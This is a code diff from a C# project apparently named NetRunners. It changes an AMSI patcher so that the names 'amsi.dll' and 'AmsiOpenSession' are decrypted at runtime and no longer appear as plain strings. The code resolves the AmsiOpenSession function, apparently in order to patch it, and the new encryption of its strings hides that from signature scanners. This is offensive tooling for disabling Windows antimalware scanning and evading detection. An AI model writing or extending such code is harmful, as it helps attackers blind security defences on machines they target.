@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using static NetRunners.Data.Delegates;
-
+using static NetRunners.Data.Encrypted;
 
 namespace NetRunners.Patchers
 {
@@ -16,12 +16,12 @@ namespace NetRunners.Patchers
             try
             {
                 // get amsi.dll pointer
-                IntPtr Library = LoadLibraryA("amsi.dll");
+                IntPtr Library = LoadLibraryA(Decrypt(amsidll_Byte));
                 if (Library == IntPtr.Zero)
                     throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");
 
                 // get amsiopensession pointer
-                IntPtr funcAddress = GetProcAddress(Library, "AmsiOpenSession");
+                IntPtr funcAddress = GetProcAddress(Library, Decrypt(AmsiOpenSession_Byte));
                 if (funcAddress == IntPtr.Zero)
                     throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");
 
